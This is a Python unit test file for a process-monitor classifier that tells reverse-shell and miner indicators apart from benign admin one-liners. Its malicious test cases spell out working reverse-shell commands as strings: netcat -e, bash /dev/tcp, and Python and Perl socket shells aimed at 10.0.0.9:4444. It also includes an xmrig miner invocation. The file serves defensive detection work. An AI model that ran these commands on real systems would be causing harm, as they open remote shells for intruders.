#!/usr/bin/env python3
"""ProcessMonitorAgent flags real reverse-shell/miner indicators, not admin one-liners (2026-10-10).
Run:  swarmsentinel-env/bin/python3 backend/tools/test_process_monitor.py"""
import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path[:0] = [os.path.join(os.path.dirname(HERE), 'agents'), os.path.dirname(HERE)]
import agent_runner as R  # noqa: E402

C = R.ProcessMonitorAgent.classify


class Benign(unittest.TestCase):
    def test_admin_python_one_liner_is_not_flagged(self):
        self.assertIsNone(C('bash -c cd /mnt/ssd/SwarmSentinel/backend && ../swarmsentinel-env/bin/python -c "import sqlite3; print(1)"'))
        self.assertIsNone(C('/usr/bin/python3 -c "print(1)"'))

    def test_substrings_of_other_words_are_not_flagged(self):
        self.assertIsNone(C('/usr/lib/dnscatalog/refresh --config x'))
        self.assertIsNone(C('/usr/bin/minerd-docs-viewer'))
        self.assertIsNone(C('nc -z localhost 22'))


class Malicious(unittest.TestCase):
    def test_miner_binaries(self):
        self.assertEqual(C('/tmp/.x/xmrig --donate-level 1'), 'xmrig')

    def test_netcat_with_exec_flag(self):
        self.assertEqual(C('nc -e /bin/sh 10.0.0.9 4444'), 'netcat-exec')
        self.assertEqual(C('/usr/bin/ncat 10.0.0.9 4444 -e /bin/bash'), 'netcat-exec')

    def test_bash_devtcp(self):
        self.assertEqual(C('bash -i >& /dev/tcp/10.0.0.9/4444 0>&1'), 'bash-devtcp')

    def test_interpreter_reverse_shell(self):
        self.assertEqual(C('python3 -c import socket,os,pty;s=socket.socket();os.dup2(s.fileno(),0);pty.spawn("sh")'),
                         'interpreter-revshell')
        self.assertEqual(C('perl -e use Socket;socket(S,PF_INET,SOCK_STREAM,6);exec("/bin/sh")'), 'interpreter-revshell')


if __name__ == '__main__':
    unittest.main()
